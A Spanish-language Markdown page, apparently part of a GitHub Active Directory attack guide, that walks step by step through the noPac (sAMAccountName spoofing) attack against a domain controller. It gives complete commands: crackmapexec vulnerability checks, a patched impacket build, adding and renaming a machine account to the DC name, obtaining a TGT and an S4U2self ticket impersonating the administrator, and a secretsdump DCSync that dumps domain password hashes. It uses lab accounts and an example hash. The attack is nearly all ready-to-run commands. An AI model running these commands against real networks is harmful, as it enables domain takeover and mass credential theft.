# SamAccountName (nopac)

Para este ataque se va a añadir un ordenador, borrar el SPN de ese ordenador, renombrar el ordenador con el mismo nombre que el DC, obtener un TGT para ese ordenador, restablecer el nombre del ordenador a su nombre original, obtener un ticket de servicio con el TGT que obtuvimos anteriormente y finalmente dcsync :)


```Bash
# Comprobamos que el equipo es vulnerable a nopac
poetry run crackmapexec smb <ip del DC> -u <user> -p <pass> -M nopac

cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac1.png?raw=true "Check NoPac")

```Bash
# Necesitamos una versión específica de impacket para los scripts renameMachine.py y getST.py (En exegol ya viene preinstalada)
git clone https://github.com/SecureAuthCorp/impacket myimpacket
cd myimpacket
git fetch origin pull/1224/head:1224
git fetch origin pull/1202/head:1202
git merge 1202
git merge 1224
cd ..
git clone https://github.com/dirkjanm/krbrelayx
```

Proceso de ejecución:

```Bash
# Añadimos un nuevo equipo
python addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host <nombre completo del DC en el dominio> -domain-netbios <dominio> '<dominio>/<user>:<pass>'
# Borramos el SPN del equipo con el script que debemos sacar del repositorio de GitHub: https://github.com/dirkjanm/krbrelayx
python addspn.py --clear -t 'samaccountname$' -u '<dominio>/<user>' -p 'pass' '<nombre completo del DC en el dominio>'
# Renombrar el nuevo equipo con el nombre del DC
python renameMachine.py -current-name 'samaccountname$' -new-name '<nombre DC>' -dc-ip '<nombre completo del DC en el dominio>' <dominio>/<user>:<pass>
# Obtenemos el TGT
python getTGT.py -dc-ip '<nombre completo del DC en el dominio>' '<dominio>'/'<nombre DC (nuevo equipo)>':'<pass equipo>'
# Devolvemos el nuevo equipo al nombre original
python renameMachine.py -current-name '<nombre DC (nuevo equipo)>' -new-name 'samaccountname$' <dominio>/<user>:<pass>
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac2.png?raw=true "NoPac manual 1")
```Bash
# Obtenemos el ST (service ticket) con S4U2self usando el TGT previo
export KRB5CCNAME=<nombre DC (nuevo equipo)>.ccache
python getST.py -self -impersonate 'administrator' -altservice 'CIFS/<nombre completo del DC en el dominio>' -k -no-pass -dc-ip '<nombre completo del DC en el dominio>' '<dominio>'/'<nombre DC (nuevo equipo)>' -debug
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac3.png?raw=true "NoPac manual 2")
```Bash
# DCSync presentando el ST
export KRB5CCNAME=administrator@CIFS_<nombre completo del DC en el dominio>@<dominio completo>.ccache
python secretsdump.py -k -no-pass -dc-ip '<nombre completo del DC en el dominio>' @'<nombre completo del DC en el dominio>'
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac4.png?raw=true "NoPac manual 3")
```Bash
# Eliminamos el equipo creado
python addcomputer.py -computer-name 'samaccountname$' -delete -dc-host <nombre completo del DC en el dominio> -domain-netbios <dominio> -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' '<dominio>/Administrator'
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/files/nopac5.png?raw=true "NoPac manual 4")

